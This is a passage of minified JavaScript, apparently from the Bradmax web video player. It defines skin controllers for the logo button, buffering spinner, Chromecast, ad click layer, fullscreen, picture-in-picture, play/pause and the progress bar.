ttonView.button.set_onClickUrlTarget(this.logoLinkTarget),this.brandButtonView.button.set_onClickUrl(this.logoLink));var b=yc.getAvailability(this.context,Rc.SKIN)?0:1;this.brandButtonView.button.alpha=b,this.brandButtonView.button.visible=!0,this.view.root.visible=!0,this.view.root.buildNativeElement(),yc.setAvailability(this.context,Rc.BRAND_BUTTON,!0),this.view.root.update(),this.brandButtonView.button.image.get_loaded()&&this.updateImage()}},loadLogoOriginalSize:function(){if(null==this.logoOriginalSize){var b=this.brandButtonView.button.image.get_size();null!=b&&0<b.length&&0<b[0]&&(this.logoOriginalSize=b)}},updateImage:function(){this.loadLogoOriginalSize(),na.add(this.context,"resize",U(this,this.updateImagePosition));var b=this.updateImagePosition(),c=new ma(ma.BRAND_IMAGE_LOADED);c.data=new Sa(this.brandButtonView.button.calculateX(),b,this.logoXPosition,this.logoYPosition),c.dispatch(this.context)},updateImageSize:function(){if(this.loadLogoOriginalSize(),null!=this.logoOriginalSize){var b=this.view.root.calculateWidth(),c=this.view.root.calculateHeight();b*=this.logoMaxWidthToScreenRatio,c*=this.logoMaxHeightToScreenRatio;var d=this.logoOriginalSize[0],q=this.logoOriginalSize[1];if(d>b){var X=b/d;this.brandButtonView.button.image.set_width(b),this.brandButtonView.button.image.set_height(q*X),this.brandButtonView.button.image.redrawCall(),d*=X,q*=X}q>c&&(this.brandButtonView.button.image.set_width(c/q*d),this.brandButtonView.button.image.set_height(c),this.brandButtonView.button.image.redrawCall())}},setImageSize:function(b,c){this.brandButtonView.button.image.set_width(b),this.brandButtonView.button.image.set_height(c),this.brandButtonView.button.image.redrawCall()},updateImagePosition:function(b){this.updateImageSize(),b=this.view.root.calculateWidth();var c=this.brandButtonView.button.image.calculateWidth();return"bottom"!=this.logoYPosition&&"right"!=this.logoXPosition||(c=this.brandButtonView.button.image.get_size()[0]),"right"==this.logoXPosition?this.brandButtonView.button.set_left(b-c):this.brandButtonView.button.set_left(0),"bottom"==this.logoYPosition?(this.updateBottomOffset(),this.brandButtonView.button.set_top(this.view.root.calculateHeight()-this.bottomOffset-c)):this.brandButtonView.button.set_top(0),this.brandButtonView.button.redrawCall(),c},updateImageBottomPosition:function(b){this.updateBottomOffset(),this.brandButtonView.button.set_top(this.view.root.calculateHeight()-this.bottomOffset-b)},updateBottomOffset:function(){if("bottom"==this.logoYPosition){var b=this.brandButtonView.titleBox.calculateHeight();"right"==this.logoXPosition&&this.brandButtonView.titleBox.calculateX()+this.brandButtonView.titleLabel.calculateTextWidth()<this.brandButtonView.button.calculateX()&&(b=10),this.bottomOffset=yc.getAvailability(this.context,Rc.SKIN)?0:this.brandButtonView.controlbarBox.calculateHeight()+b}},dispatchBrandImageLoadedEvent:function(b){var c=new ma(ma.BRAND_IMAGE_LOADED);c.data=new Sa(this.brandButtonView.button.calculateX(),b,this.logoXPosition,this.logoYPosition),c.dispatch(this.context)},__class__:ie});var je=function(){this.isComplete=this.canShow=!1,zb.call(this)};wa["bs.player.plugin.skin.controller.element.BufferSpinnerController"]=je,je.__name__="bs.player.plugin.skin.controller.element.BufferSpinnerController",je.__super__=zb,je.prototype=Ja(zb.prototype,{isComplete:null,canShow:null,init:function(){zb.prototype.init.call(this),null!=this.view&&(T.add(this.context,"bufferingStart",U(this,this.onBufferingStart)),T.add(this.context,"bufferingEnd",U(this,this.onBufferingEnd)),T.add(this.context,"seekingEnd",U(this,this.onBufferingEnd)),T.add(this.context,"playing",U(this,this.onBufferingEnd)),T.add(this.context,"complete",U(this,this.onComplete)),aa.add(this.context,"mediaMetadataData",U(this,this.onDataAdded)),ma.add(this.context,ma.HIDE_BUFFERSPINNER,U(this,this.disableSpinner)),Q.add(this.context,"adPlay",U(this,this.onAdPlaying)),Q.add(this.context,"adPlaying",U(this,this.onAdPlaying)),Q.add(this.context,"adComplete",U(this,this.onAdComplete)))},destroy:function(){T.remove(this.context,"bufferingStart",U(this,this.onBufferingStart)),T.remove(this.context,"bufferingEnd",U(this,this.onBufferingEnd)),T.remove(this.context,"seekingEnd",U(this,this.onBufferingEnd)),T.remove(this.context,"playing",U(this,this.onBufferingEnd)),T.remove(this.context,"complete",U(this,this.onComplete)),aa.remove(this.context,"mediaMetadataData",U(this,this.onDataAdded)),ma.remove(this.context,ma.HIDE_BUFFERSPINNER,U(this,this.disableSpinner)),Q.remove(this.context,"adPlay",U(this,this.onAdPlaying)),Q.remove(this.context,"adPlaying",U(this,this.onAdPlaying)),Q.remove(this.context,"adComplete",U(this,this.onAdComplete)),zb.prototype.destroy.call(this)},disableSpinner:function(b){this.canShow=!1,this.view.root.visible=!1,this.view.root.destroyNativeElement(),T.remove(this.context,"bufferingStart",U(this,this.onBufferingStart)),T.remove(this.context,"bufferingEnd",U(this,this.onBufferingEnd)),T.remove(this.context,"seekingEnd",U(this,this.onBufferingEnd)),T.remove(this.context,"playing",U(this,this.onBufferingEnd)),T.remove(this.context,"complete",U(this,this.onComplete)),aa.remove(this.context,"mediaMetadataData",U(this,this.onDataAdded)),Q.remove(this.context,"adPlay",U(this,this.onAdPlaying)),Q.remove(this.context,"adPlaying",U(this,this.onAdPlaying)),Q.remove(this.context,"adComplete",U(this,this.onAdComplete))},onDataAdded:function(b){this.isComplete=!1,this.canShow=!0},onComplete:function(b){this.isComplete=!0,this.view.root.visible=!1,this.view.root.destroyNativeElement()},onBufferingEnd:function(b){this.view.root.visible=!1,this.view.root.destroyNativeElement()},onBufferingStart:function(b){b="Edge"==h.browserName;var c=null!=this.variables.xmmapi;this.isComplete||!this.canShow||b&&c||(this.view.root.visible=!0,this.view.root.buildNativeElement(!0))},onAdPlaying:function(b){this.view.root.visible=!1,this.view.root.destroyNativeElement()},onAdComplete:function(b){this.view.root.visible=!1,this.view.root.destroyNativeElement()},__class__:je});var Qd=function(){zb.call(this),this.isAvailable=this.castingButtonVisible=!1};wa["bs.player.plugin.skin.controller.element.ChromecastController"]=Qd,Qd.__name__="bs.player.plugin.skin.controller.element.ChromecastController",Qd.__super__=zb,Qd.prototype=Ja(zb.prototype,{castingButtonVisible:null,isAvailable:null,sender:null,init:function(){if(zb.prototype.init.call(this),null!=this.view&&null!=this.view.root){this.hideButton();var b=Ic.getConfigValue(this.variables,"videoCastEnabled");null!=b&&(this.castingButtonVisible=b),this.castingButtonVisible&&this.isCastingSupportedByDevice()&&(this.sender=new Jc(this.context,U(this,this.onChromecastApiLoad)))}},showButton:function(){null!=this.view&&null!=this.view.root&&(this.view.root.removeEventListener("click",U(this,this.onButtonClick)),this.view.root.addEventListener("click",U(this,this.onButtonClick)),this.view.root.visible=!0,this.showSpacers(!0),this.buildRoot(!0))},showSpacers:function(b){if(null!=this.view&&null!=this.view.root){var c=this.view;null!=c.preSpacer&&(c.preSpacer.visible=b),null!=c.postSpacer&&(c.postSpacer.visible=b)}},hideButton:function(){null!=this.view&&null!=this.view.root&&(this.showSpacers(!1),this.view.root.removeEventListener("click",U(this,this.onButtonClick)),this.view.root.visible=!1,this.destroyRoot())},onButtonClick:function(b){new W("chromecast").dispatch(this.context)},checkButtonVisibility:function(){this.castingButtonVisible&&this.isAvailable?this.showButton():this.hideButton()},isCastingSupportedByDevice:function(){return"Firefox"!=h.browserName},onChromecastApiLoad:function(){null!=this.sender&&(this.isAvailable=this.sender.get_isAvailable(),this.checkButtonVisibility())},destroy:function(){zb.prototype.destroy.call(this),null!=this.sender&&(this.sender.destroy(),this.sender=null)},__class__:Qd});var jc=function(){this.adWasClicked=!1,this.adMediaClickTargetUrl=null,this.isListening=this.keepSkinOnAd=this.adBreakActive=!1,zb.call(this)};wa["bs.player.plugin.skin.controller.element.ClickableLayerController"]=jc,jc.__name__="bs.player.plugin.skin.controller.element.ClickableLayerController",jc.__super__=zb,jc.prototype=Ja(zb.prototype,{isListening:null,keepSkinOnAd:null,adBreakActive:null,adMediaClickTargetUrl:null,adWasClicked:null,init:function(){zb.prototype.init.call(this),null!=this.view&&null!=this.view.root&&(zb.prototype.buildRoot.call(this),ma.add(this.context,ma.SETUP_CLICKABLE_LAYER,U(this,this.onSetup)),this.view.root.addEventListener("mouseup",U(this,this.dispatchPlayPause)),this.isListening=!0,this.keepSkinOnAd=Object.prototype.hasOwnProperty.call(this.variables,"keepSkinOnAd")&&1==m.field(this.variables,"keepSkinOnAd"))&&(Q.add(this.context,"adDisableControls",U(this,this.onAdBreakStart)),Q.add(this.context,"adEnableControls",U(this,this.onAdBreakEnd)),Q.add(this.context,"adInStreamPlaying",U(this,this.onAdBreakStart)),Q.add(this.context,"adInStreamClipPlaying",U(this,this.onAdStart)))},destroy:function(){null!=this.view.root&&(this.view.root.removeEventListener("mouseup",U(this,this.dispatchPlayPause)),this.isListening=!1),this.keepSkinOnAd&&(Q.remove(this.context,"adDisableControls",U(this,this.onAdBreakStart)),Q.remove(this.context,"adEnableControls",U(this,this.onAdBreakEnd)),Q.remove(this.context,"adInStreamPlaying",U(this,this.onAdBreakStart)),Q.remove(this.context,"adInStreamClipPlaying",U(this,this.onAdStart))),zb.prototype.destroy.call(this)},onAdStart:function(b){this.adMediaClickTargetUrl=b.data.mediaClickTargetUrl,this.adWasClicked=!1,this.adBreakActive=!0},onAdBreakStart:function(b){this.adBreakActive=!0},onAdBreakEnd:function(b){this.adBreakActive=!1},onSetup:function(b){null!=this.view&&null!=b.data&&((b=b.data).backdrop&&"backdrop"!=this.view.root.drawStateName[0]?(this.view.root.setStateName(["backdrop"]),this.view.root.redrawCall()):"normal"!=this.view.root.drawStateName[0]&&(this.view.root.setStateName(["normal"]),this.view.root.redrawCall()),b.clickable?this.isListening||(this.view.root.addEventListener("mouseup",U(this,this.dispatchPlayPause)),this.isListening=!0):this.isListening&&(this.view.root.removeEventListener("mouseup",U(this,this.dispatchPlayPause)),this.isListening=!1))},dispatchPlayPause:function(b){new ma(ma.ANIMATE_SHOW).dispatch(this.context),h.mobile||(this.keepSkinOnAd&&this.adBreakActive&&!this.adWasClicked&&null!=this.adMediaClickTargetUrl?this.handleAdClick():new W("skinPlayPause").dispatch(this.context))},handleAdClick:function(){this.adWasClicked=!0;var b=new Q("adAdClick");b.data={url:this.adMediaClickTargetUrl},b.dispatch(this.context),window.open(this.adMediaClickTargetUrl,"_blank")},__class__:jc});var ke=function(){zb.call(this)};wa["bs.player.plugin.skin.controller.element.ControlbarController"]=ke,ke.__name__="bs.player.plugin.skin.controller.element.ControlbarController",ke.__super__=zb,ke.prototype=Ja(zb.prototype,{controlbarView:null,init:function(){zb.prototype.init.call(this),null!=this.view&&null!=this.view.stage&&null!=this.view.root&&(this.controlbarView=this.view)},__class__:ke});var le=function(){zb.call(this),this.isFullscreenEmulationActive=this.isFullscreenEmulation=!1};wa["bs.player.plugin.skin.controller.element.FullscreenController"]=le,le.__name__="bs.player.plugin.skin.controller.element.FullscreenController",le.__super__=zb,le.prototype=Ja(zb.prototype,{onFullscreenChangeTimer:null,isFullscreenEmulation:null,isFullscreenEmulationActive:null,init:function(){zb.prototype.init.call(this),null!=this.view&&null!=this.view.root&&((h.isiOS&&Object.prototype.hasOwnProperty.call(this.variables,"wrapperName")||Object.prototype.hasOwnProperty.call(this.variables,"hideUIElements")&&null!=m.field(this.variables,"hideUIElements")&&-1<fb.__cast(m.field(this.variables,"hideUIElements"),String).indexOf("fullscreenButton"))&&(this.view.root.visible=!1),this.view.root.addEventListener("click",U(this,this.onBtnFullscreenClick)),W.add(this.context,"fullscreenToggleRequest",U(this,this.onBtnFullscreenClick)),window.document.addEventListener(A.get_FULLSCREEN_CHANGE(),U(this,this.onFullscreenChange)),na.add(this.context,"repaint",U(this,this.onRepaint)))},destroy:function(){this.stopOnFullscreenChangeTimer(),null!=this.view.root&&this.view.root.removeEventListener("click",U(this,this.onBtnFullscreenClick)),W.remove(this.context,"fullscreenToggleRequest",U(this,this.onBtnFullscreenClick)),window.document.removeEventListener(A.get_FULLSCREEN_CHANGE(),U(this,this.onFullscreenChange)),na.remove(this.context,"repaint",U(this,this.onRepaint)),zb.prototype.destroy.call(this)},onBtnFullscreenClick:function(b){h.isSmartTV()||(this.isFullscreen()?this.exitFullscreen():this.enterFullscreen()),new W("fullscreen").dispatch(this.context),this.onFullscreenChange(null)},isFullscreen:function(){var b=!1,c=window.document,d=window;return d.bradmaxIsFullscreenEnabled?b=d.bradmaxIsFullscreenEnabled():this.isFullscreenEmulation?b=this.isFullscreenEmulationActive:(c.fullscreenElement||c.webkitFullscreenElement||c.mozFullScreenElement||c.msFullscreenElement)&&(b=!0),b},enterFullscreen:function(){var b=this.view.stage.element.instance.parentElement,c=window,d=null;c.bradmaxSetFullscreen?c.bradmaxSetFullscreen(!0):this.isFullscreenEmulation?this.enterEmulatedFullscreen():b.requestFullscreen?d=b.requestFullscreen():b.requestFullScreen?d=b.requestFullScreen():b.msRequestFullscreen?d=b.msRequestFullscreen():b.mozRequestFullScreen?d=b.mozRequestFullScreen():b.webkitRequestFullscreen?d=b.webkitRequestFullscreen():(this.isFullscreenEmulation=!0,this.enterEmulatedFullscreen()),null!=d&&d.catch((function(q){console.warn("BRADMAX PLAYER NOTICE:\nBrowser doesn't allow openinng fullscreen mode without user interaction.\nPlayer is waiting for user to click 'fullscreen' button.\n\nPlease also check server HTTP response headers. Fullscreen could be also blocked by setting Feature-Policy proper header https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Feature-Policy/fullscreen \n\n",q)}))},enterEmulatedFullscreen:function(){this.isFullscreenEmulationActive=!0;var b=this.view.stage.element.instance.parentElement,c=b.style;b.setAttribute("data-pre-fullscreen",b.style.cssText),c.objectFit="contain",c.userSelect="text",c.position="fixed",c.top="0",c.left="0",c.boxSizing="border-box",c.minWidth="0px",c.maxWidth="nonet",c.minHeight="0px",c.maxHeight="none",c.width="100%",c.height="100%",c.transform="none",c.inset="0px",c.margin="0px",c.zIndex="10000"},exitFullscreen:function(){var b=window.document,c=window;c.bradmaxSetFullscreen?c.bradmaxSetFullscreen(!1):this.isFullscreenEmulation?this.exitEmulatedFullscreen():b.exitFullscreen?b.exitFullscreen():b.exitFullScreen?b.exitFullScreen():b.msExitFullscreen?b.msExitFullscreen():b.mozCancelFullScreen?b.mozCancelFullScreen():b.webkitExitFullscreen&&b.webkitExitFullscreen()},exitEmulatedFullscreen:function(){this.isFullscreenEmulationActive=!1;var b=this.view.stage.element.instance.parentElement;b.style.cssText=b.getAttribute("data-pre-fullscreen")},onFullscreenChange:function(b){this.stopOnFullscreenChangeTimer(),this.onFullscreenChangeTimer=Rb.delay(U(this,this.checkFullscreenButton),500)},stopOnFullscreenChangeTimer:function(){null!=this.onFullscreenChangeTimer&&(this.onFullscreenChangeTimer.stop(),this.onFullscreenChangeTimer=null)},checkFullscreenButton:function(){this.view.root.currentStateName[1]=this.isFullscreen()?"fullscreen":"embed",this.view.root.setStateName(this.view.root.currentStateName)},onRepaint:function(b){this.checkFullscreenButton()},__class__:le});var Hd=function(){zb.call(this),this.pictureInPictureButtonVisible=!1};wa["bs.player.plugin.skin.controller.element.PictureInPictureController"]=Hd,Hd.__name__="bs.player.plugin.skin.controller.element.PictureInPictureController",Hd.__super__=zb,Hd.prototype=Ja(zb.prototype,{htmlVideo:null,pictureInPictureButtonVisible:null,init:function(){var b=Ic.getConfigValue(this.variables,"pictureInPictureButtonVisible");null!=b&&(this.pictureInPictureButtonVisible=b),zb.prototype.init.call(this),W.add(this.context,"pipEnter",U(this,this.onPipEnterEvent)),W.add(this.context,"pipLeave",U(this,this.onPipLeaveEvent)),T.add(this.context,"videoMediaElementInit",U(this,this.onVideoMediaElementInit)),T.add(this.context,"playing",U(this,this.onVideoPlaying)),this.checkButtonVisibility()},destroy:function(){this.pipLeave(),W.remove(this.context,"pipEnter",U(this,this.onPipEnterEvent)),W.remove(this.context,"pipLeave",U(this,this.onPipLeaveEvent)),T.remove(this.context,"videoMediaElementInit",U(this,this.onVideoMediaElementInit)),T.remove(this.context,"playing",U(this,this.onVideoPlaying)),T.remove(this.context,"currentTimeChange",U(this,this.onVideoMetadataLoaded)),zb.prototype.destroy.call(this)},showButton:function(){null!=this.view&&null!=this.view.root&&(this.view.root.removeEventListener("click",U(this,this.onButtonClick)),this.view.root.addEventListener("click",U(this,this.onButtonClick)),this.view.root.visible=!0,this.showSpacers(!0),this.buildRoot(!0))},showSpacers:function(b){if(null!=this.view&&null!=this.view.root){var c=this.view;null!=c.preSpacer&&(c.preSpacer.visible=b),null!=c.postSpacer&&(c.postSpacer.visible=b)}},hideButton:function(){null!=this.view&&null!=this.view.root&&(this.showSpacers(!1),this.view.root.removeEventListener("click",U(this,this.onButtonClick)),this.view.root.visible=!1,this.destroyRoot())},isVideoOpenedInPip:function(){var b=this.htmlVideo;return document.pictureInPictureElement&&b===document.pictureInPictureElement},onButtonClick:function(b){this.isVideoOpenedInPip()?this.pipLeave():this.pipEnter()},onVideoMediaElementInit:function(b){this.htmlVideo=b.data},onVideoPlaying:function(b){this.checkButtonVisibility(),T.addOnce(this.context,"currentTimeChange",U(this,this.onVideoMetadataLoaded))},onVideoMetadataLoaded:function(b){this.checkButtonVisibility()},checkButtonVisibility:function(){this.pictureInPictureButtonVisible&&this.isPipAvailable()&&this.canBePipEnabled()?this.showButton():this.hideButton()},canBePipEnabled:function(){var b=this.htmlVideo;return null!=this.htmlVideo&&null!=b.requestPictureInPicture&&(!(1>=this.htmlVideo.readyState)||null!=this.htmlVideo.seekable&&0<this.htmlVideo.seekable.length)},isPipAvailable:function(){return"pictureInPictureEnabled"in document},onPipEnterEvent:function(b){this.pipEnter()},onPipLeaveEvent:function(b){this.pipLeave()},onPlayClickInPipView:function(){new W("skinPlay").dispatch(this.context)},onPauseClickInPipView:function(){new W("skinPause").dispatch(this.context)},pipEnter:function(){if(this.isPipAvailable()){var b=this.htmlVideo;this.canBePipEnabled()?(b.requestPictureInPicture(),navigator&&navigator.mediaSession&&(navigator.mediaSession.setActionHandler("play",U(this,this.onPlayClickInPipView)),navigator.mediaSession.setActionHandler("pause",U(this,this.onPauseClickInPipView)))):this.log("Video element is not ready yet for entering Picture-in-Picture mode.","warn")}else this.log("Picture in picture API is not available for this browser.","warn")},pipLeave:function(){if(this.isPipAvailable()){var b=window.document;null!=b.exitPictureInPicture&&null!=b.pictureInPictureElement&&b.exitPictureInPicture()}else this.log("Picture in picture API is not available for this browser.","warn")},log:function(b,c){null==c&&(c="log"),console&&("error"==c?console.error(b):"warn"==c?console.warn(b):console.log(b))},__class__:Hd});var Rd=function(){zb.call(this)};wa["bs.player.plugin.skin.controller.element.PlayPauseReloadController"]=Rd,Rd.__name__="bs.player.plugin.skin.controller.element.PlayPauseReloadController",Rd.__super__=zb,Rd.prototype=Ja(zb.prototype,{isPlaying:null,durationTime:null,init:function(){zb.prototype.init.call(this),null!=this.view&&(this.view.root.addEventListener("click",U(this,this.onBtnClick)),T.add(this.context,"playing",U(this,this.onVideoPlaying)),T.add(this.context,"paused",U(this,this.onVideoPaused)),T.add(this.context,"complete",U(this,this.onVideoComplete)))},destroy:function(){null!=this.view.root&&this.view.root.removeEventListener("click",U(this,this.onBtnClick)),T.remove(this.context,"playing",U(this,this.onVideoPlaying)),T.remove(this.context,"paused",U(this,this.onVideoPaused)),T.remove(this.context,"complete",U(this,this.onVideoComplete)),zb.prototype.destroy.call(this)},onVideoPlaying:function(b){null!=this.view&&(this.view.root.currentStateName[1]="pause",this.view.root.setStateName(this.view.root.currentStateName))},onVideoPaused:function(b){null!=this.view&&(this.view.root.currentStateName[1]="play",this.view.root.setStateName(this.view.root.currentStateName))},onVideoComplete:function(b){null!=this.view&&(this.view.root.currentStateName[1]="reload",this.view.root.setStateName(this.view.root.currentStateName),T.addOnce(this.context,"currentTimeChange",U(this,this.onCurrentTimeChange)),null!=b.data&&null!=b.data.media&&b.data.media instanceof Ca&&this.view.root instanceof ta&&(this.view.root.visible=!1))},onBtnClick:function(b){b.stopPropagation(),new W("skinPlayPause").dispatch(this.context)},onCurrentTimeChange:function(b){b.data.currentTime<b.data.duration&&(null!=b.data.media&&null!=b.data.media.mediaPlaybackInfo&&b.data.media.mediaPlaybackInfo.isPlaying?this.onVideoPlaying(b):this.onVideoPaused(b))},__class__:Rd});var xd=function(){this.skinHidden=!0,this.adEndTime=this.adsDuration=null,this.popupResizeOffset=0,this.isLive=this.isDvr=this.isDvrWallTimeMode=this.isSeeking=!1,this.indicatorMax=this.indicatorMin=this.indicatorCurrent=this.indicatorWidth=this.indicatorHalfWidth=this.targetMove=0,this.isTrackDown=this.isIndicatorDown=!1,this.dvrMinLenForSeekbar=60,this.time=this.duration=0,zb.call(this)};wa["bs.player.plugin.skin.controller.element.ProgressController"]=xd,xd.__name__="bs.player.plugin.skin.controller.element.ProgressController",xd.__super__=zb,xd.prototype=Ja(zb.prototype,{progressView:null,timer:null,time:null,duration:null,dvrMinLenForSeekbar:null,media:null,isTrackDown:null,isIndicatorDown:null,lastMousePosition:null,disableHtmlSelectionFunction:null,indicatorMax:null,indicatorMin:null,indicatorCurrent:null,indicatorWidth:null,indicatorHalfWidth:null,targetMove:null,isLive:null,isDvr:null,isDvrWallTimeMode:null,isSeeking:null,stageStartSize:null,popupResizeOffset:null,lastWidth:null,adEndTime:null,adsDuration:null,skinHidden:null,skinHideTimer:null,progressPopup:null,progressSegment:null,progressMarker:null,init:function(){if(zb.prototype.init.call(this),null!=this.view&&null!=this.view.root){this.progressView=this.view;var b=!1;Object.prototype.hasOwnProperty.call(this.variables,"keepSkinOnAd")&&(b=1==m.field(this.variables,"keepSkinOnAd"));var c=Ic.getConfigValue(this.variables,"isDvrWallTimeMode");null!=c&&(this.isDvrWallTimeMode=c),null!=this.progressView.popup&&null!=this.progressView.segmentList&&null!=this.progressView.markerList&&null!=this.progressView.track&&null!=this.progressView.indicator&&null!=this.progressView.time&&null!=this.progressView.duration&&null!=this.progressView.duration&&(this.indicatorWidth=this.progressView.indicator.calculateWidth(),this.indicatorHalfWidth=this.indicatorWidth/2,this.progressPopup=new de(this.context,this.progressView),this.progressSegment=new ee(this.progressView),this.progressMarker=new fe(this.progressView),ma.add(this.context,ma.THUMB_LOADED,U(this,this.onThumbLoad)),W.add(this.context,"skinControlbarHide",U(this,this.onSkinHide)),W.add(this.context,"skinControlbarShow",U(this,this.onSkinShow)),na.add(this.context,"resize",U(this,this.onResize)),T.add(this.context,"currentTimeChange",U(this,this.onCurrentTimeChange)),T.add(this.context,"durationChange",U(this,this.onDurationChange)),T.add(this.context,"seekingEnd",U(this,this.onSeekingEnd)),aa.add(this.context,"mediaMetadataData",U(this,this.onMetadataData)),aa.add(this.context,"mediaAfterPlaybackStartMetadata",U(this,this.onAfterPlaybackStartMetadataData)),this.progressView.track.parent.addEventListener("mousedown",U(this,this.onTrackDown)),this.progressView.track.parent.addEventListener("mouseup",U(this,this.onTrackUp)),h.isMobile()&&(this.progressView.track.parent.addEventListener("touchstart",U(this,this.onTrackDown)),this.progressView.track.parent.addEventListener("touchend",U(this,this.onTrackUp)),this.progressView.indicator.addEventListener("touchstart",U(this,this.onIndicatorDown))),this.progressView.root.addEventListener("mouseenter",U(this,this.onTrackOver)),this.progressView.root.addEventListener("mouseleave",U(this,this.onTrackOut)),this.progressView.indicator.addEventListener("mousedown",U(this,this.onIndicatorDown)),this.progressView.stage.addEventListener("mousedown",U(this,this.onStageDown)),c=this.progressView.stage,this.stageStartSize=new Vb(c.calculateWidth(),c.calculateHeight()),this.progressView.time.set_text("0:00:00"),this.progressView.duration.set_text("0:00:00"),null!=this.progressView.liveButton&&(this.progressView.liveButton.visible=!1,null!=this.progressView.liveButtonPreSpacer&&(this.progressView.liveButtonPreSpacer.visible=!1),null!=this.progressView.liveButtonPostSpacer&&(this.progressView.liveButtonPostSpacer.visible=!1),this.progressView.liveButton.addEventListener("mousedown",U(this,this.onLiveButtonClick)),this.progressView.liveButton.currentStateName[1]="sync",this.progressView.liveButton.setStateName(this.progressView.liveButton.currentStateName)),null!=this.progressView.adLabel&&(this.progressView.adLabel.visible=!1,this.progressView.adLabel.destroyNativeElement()),this.timer=new Rb(25),this.timer.run=U(this,this.checkResize),this.updateMax(),this.disableAdView(),b&&(Q.add(this.context,"adEnableControls",U(this,this.disableAdView)),Q.add(this.context,"adDisableControls",U(this,this.enableAdView)),Q.add(this.context,"adInStreamPlaying",U(this,this.adBlock))))}},shouldBeAdBlockSkipped:function(){return this.isSeeking},adBlock:function(b){if(!this.shouldBeAdBlockSkipped()){if(null!=b.data&&null!=b.data.adsDuration){b=b.data.adsDuration;for(var c=this.adsDuration=0;c<b.length;){var d=b[c];++c,this.adsDuration+=d}}null!=this.progressView.popup&&this.progressPopup.destroy()}},enableAdView:function(b){this.shouldBeAdBlockSkipped()||(this.progressView.time.visible=!1,this.progressView.root.visible=!1,this.progressView.duration.visible=!1,this.progressView.segmentList.visible=!1,this.progressView.markerList.visible=!1,this.progressView.track.visible=!1,this.progressView.indicator.visible=!1,this.progressView.root.removeEventListener("mousemove",U(this,this.onTrackMove)),this.progressView.time.destroyNativeElement(),this.progressView.root.destroyNativeElement(),this.progressView.duration.destroyNativeElement(),this.progressView.segmentList.destroyNativeElement(),this.progressView.markerList.destroyNativeElement(),this.progressView.track.destroyNativeElement(),this.progressView.indicator.destroyNativeElement(),null!=this.progressView.popup&&this.progressPopup.destroy(),null!=this.progressView.adLabel&&(this.progressView.adLabel.visible=!0,this.progressView.adLabel.buildNativeElement(),this.progressView.adLabel.set_text("")),this.refreshParentContainer())},refreshParentContainer:function(){var b=this.progressView.root.parent;null!=b&&b.update()},disableAdView:function(b){this.shouldBeAdBlockSkipped()||(this.progressView.time.visible=!0,this.progressView.root.visible=!0,this.progressView.duration.visible=!0,this.progressView.segmentList.visible=!0,this.progressView.markerList.visible=!0,this.progressView.track.visible=!0,this.progressView.indicator.visible=!0,this.progressView.time.buildNativeElement(),this.progressView.root.buildNativeElement(),this.progressView.duration.buildNativeElement(),this.progressView.segmentList.buildNativeElement(),this.progressView.markerList.buildNativeElement(),this.progressView.track.buildNativeElement(),this.progressView.indicator.buildNativeElement(),null!=this.progressView.popup&&this.progressPopup.init(),null!=this.progressView.adLabel&&(this.progressView.adLabel.visible=!1,this.progressView.adLabel.destroyNativeElement()),this.adsDuration=this.adEndTime=null,this.refreshParentContainer())},adEndTimeUpdate:function(){if(null!=this.progressView.adLabel){null==this.adEndTime&&(this.adEndTime=this.media.mediaPlaybackInfo.currentTime+this.adsDuration);var b=this.adEndTime-this.media.mediaPlaybackInfo.currentTime,c=Yb.translate("advertisement_title_on_progressbar");0<=b&&(c+=" "+Yb.formatTimeMinutes(b)),this.progressView.adLabel.set_text(c)}},destroy:function(){null!=this.timer&&this.timer.stop(),this.timer=null,na.remove(this.context,"resize",U(this,this.onResize)),T.remove(this.context,"currentTimeChange",U(this,this.onCurrentTimeChange)),T.remove(this.context,"durationChange",U(this,this.onDurationChange)),T.remove(this.context,"seekingEnd",U(this,this.onSeekingEnd)),aa.remove(this.context,"mediaMetadataData",U(this,this.onMetadataData)),aa.remove(this.context,"mediaAfterPlaybackStartMetadata",U(this,this.onAfterPlaybackStartMetadataData)),null!=this.progressView&&(null!=this.progressView.track&&(null!=this.progressView.track.parent&&(this.progressView.track.parent.removeEventListener("mousedown",U(this,this.onTrackDown)),this.progressView.track.parent.removeEventListener("mouseup",U(this,this.onTrackUp))),null!=this.progressView.track.parent&&h.isMobile()&&(this.progressView.track.parent.removeEventListener("touchstart",U(this,this.onTrackDown)),this.progressView.track.parent.removeEventListener("touchend",U(this,this.onTrackUp))),this.progressView.root.removeEventListener("mouseenter",U(this,this.onTrackOver)),this.progressView.root.removeEventListener("mouseleave",U(this,this.onTrackOut))),null!=this.progressView.indicator&&this.progressView.indicator.removeEventListener("mousedown",U(this,this.onIndicatorDown)),null!=this.progressView.stage&&this.progressView.stage.removeEventListener("mousedown",U(this,this.onStageDown)),null!=this.progressView.liveButton&&this.progressView.liveButton.removeEventListener("mousedown",U(this,this.onLiveButtonClick))),Q.remove(this.context,"adEnableControls",U(this,this.disableAdView)),Q.remove(this.context,"adDisableControls",U(this,this.enableAdView)),Q.remove(this.context,"adInStreamPlaying",U(this,this.adBlock)),zb.prototype.destroy.call(this)},checkResize:function(){var b=this.progressView.track.calculateWidth();this.lastWidth!=b&&(this.updateMax(),this.updateProgressResize()),this.lastWidth=b},onMetadataData:function(b){this.time=0,this.isSeeking=this.isIndicatorDown=this.isTrackDown=!1,this.targetMove=this.indicatorCurrent=this.indicatorMin=this.indicatorMax=0,this.media=b.data,this.isDvr=this.media instanceof Zb?this.isLive=!1:this.media instanceof xa?this.isLive=!0:this.isLive=!1,this.duration=this.media.duration,Object.prototype.hasOwnProperty.call(this.variables,"dvrMinLenForSeekbar")&&0<=this.variables.dvrMinLenForSeekbar&&(this.dvrMinLenForSeekbar=this.variables.dvrMinLenForSeekbar),this.progressView.duration.set_text(Yb.formatTime(this.media.duration)),this.updateMax(),this.updateProgressMetadataData()},onAfterPlaybackStartMetadataData:function(b){b.data instanceof xa&&!this.isDvr&&(this.isDvr=this.isLive=!0),b.data instanceof 